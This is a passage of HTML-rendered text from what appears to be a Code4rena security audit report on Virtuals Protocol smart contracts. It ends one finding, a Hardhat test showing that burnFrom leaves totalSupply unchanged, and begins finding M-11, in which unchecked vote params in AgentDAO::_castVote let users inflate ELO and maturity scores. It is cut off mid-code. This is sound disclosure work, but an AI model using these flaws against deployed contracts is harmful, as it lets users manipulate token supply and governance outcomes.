class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FunToken\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FUN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;1000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewaitForDeployment\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;should not reduce totalSupply when using burnFrom (BUG)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Burn tokens from addr1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;50\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Esto debería fallar porque totalSupply no cambió\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;- test para detectar el bug\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// output\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereduce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eusing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBUG\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epassing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (2\u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efailing\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereduce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eusing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBUG\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e):\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  AssertionError: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000000000000000000000000000000000000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebelow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000000000000000000000000000000000000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"explanation\" style=\"position:relative;\"\u003e\u003ca href=\"#explanation\" aria-label=\"explanation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExplanation\u003c/h3\u003e\n\u003cp\u003eThis test checks if the \u003ccode\u003eburnFrom\u003c/code\u003e function correctly reduces the total supply when the owner burns tokens from another user (\u003ccode\u003eaddr1\u003c/code\u003e). In a properly implemented ERC20 token, burning tokens should reduce both the user’s balance and the total supply.\u003c/p\u003e\n\u003ch3 id=\"what-this-means\" style=\"position:relative;\"\u003e\u003ca href=\"#what-this-means\" aria-label=\"what this means permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eWhat this means\u003c/h3\u003e\n\u003cp\u003eThe test expected \u003ccode\u003efinalTotalSupply\u003c/code\u003e to be less than \u003ccode\u003einitialTotalSupply\u003c/code\u003e,\nbut both values were exactly the same: \u003ccode\u003e1000000000000000000000000000000000000000\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"the-core-issue\" style=\"position:relative;\"\u003e\u003ca href=\"#the-core-issue\" aria-label=\"the core issue permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eThe core issue\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eBoth \u003ccode\u003einitialTotalSupply\u003c/code\u003e and \u003ccode\u003efinalTotalSupply\u003c/code\u003e remain unchanged after burning.\u003c/li\u003e\n\u003cli\u003eAlthough \u003ccode\u003eburnFrom\u003c/code\u003e decreases the user’s balance and emits a Transfer (user, \u003ccode\u003eaddress(0)\u003c/code\u003e, amount) event (mimicking a burn), the \u003ccode\u003e_totalSupply\u003c/code\u003e is never updated.\u003c/li\u003e\n\u003cli\u003eThis is a major inconsistency that breaks the expected behavior of a burn function and introduces risk.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\" style=\"position:relative;\"\u003e\u003ca href=\"#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\" aria-label=\"m 11 agentdao_castvote doesnt check the array of votes emitted which determine the number of battles fought in elocalculatorsol allowing the user to increase the elo of a contribution unfairly inflating the maturityimpact of servicenfts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-45\"\u003e[M-11] \u003ccode\u003eAgentDAO::_castVote\u003c/code\u003e doesn’t check the array of votes emitted, which determine the number of battles fought in \u003ccode\u003eEloCalculator.sol\u003c/code\u003e, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of \u003ccode\u003eServiceNFTs\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-771\"\u003eJeremias\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-389\"\u003eoakcobalt\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-132\"\u003eShinobi\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-6\" aria-label=\"finding description 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eWe have this in their whitepaper:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003eWhen validating a model, validators are presented with two models anonymously for comparison. They go through 10 rounds of interaction with each model pair, selecting the better responses. After 10 rounds, a vote is submitted with the final outcomes.\u003c/li\u003e\n\u003cli\u003eAnonymity in model comparison prevents collusion and bias among validators and contributors, ensuring a fair model selection process.\u003c/li\u003e\n\u003cli\u003eVirtual Protocol has opted for the Elo Rating System for model comparison.”\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eOther than the issue of direct on-chain transactions submitted by validators, the elo calculation system of \u003ccode\u003eserviceNft\u003c/code\u003e isn’t actually capped at 10 rounds, but receives an arbitrary amount of votes that a user directly interacting with the service can determine, both in rounds and value.\u003c/p\u003e\n\u003cp\u003eThis is the \u003ccode\u003eAgentDAO\u003c/code\u003e override of the \u003ccode\u003e_castVote\u003c/code\u003e function (to be called by \u003ccode\u003ecastVoteWithReasonAndParams\u003c/code\u003e). It takes \u003ccode\u003eparams\u003c/code\u003e as argument. Which is an encoded \u003ccode\u003euint8[]\u003c/code\u003e array representing the result (votes) of those rounds.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _castVote(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 proposalId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address account,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8 support,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        string memory reason, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bytes memory params //@audit params can also be passed as arguments\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) internal override returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!votedPreviously \u0026amp;\u0026amp; hasVoted(proposalId, account)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ++_totalScore;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (params.length \u0026gt; 0 \u0026amp;\u0026amp; support == 1) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;                _updateMaturity(account, proposalId, weight, params); //@audit params is never checked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return weight;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we saw in \u003ccode\u003eagentDAO::_castVote\u003c/code\u003e, the params are passed to the \u003ccode\u003eagentDAO::_updateMaturity\u003c/code\u003e function: \u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_updateMaturity\u003c/code\u003e passes those to \u003ccode\u003e_calculateMaturity\u003c/code\u003e, to update the “maturity” of the proposal (which should be construed as a relevant measure that weights in the final importance of implementing a new service or not, related to the \u003ccode\u003eELO\u003c/code\u003e and \u003ccode\u003eweight\u003c/code\u003e of vote):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params /*votes*/) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        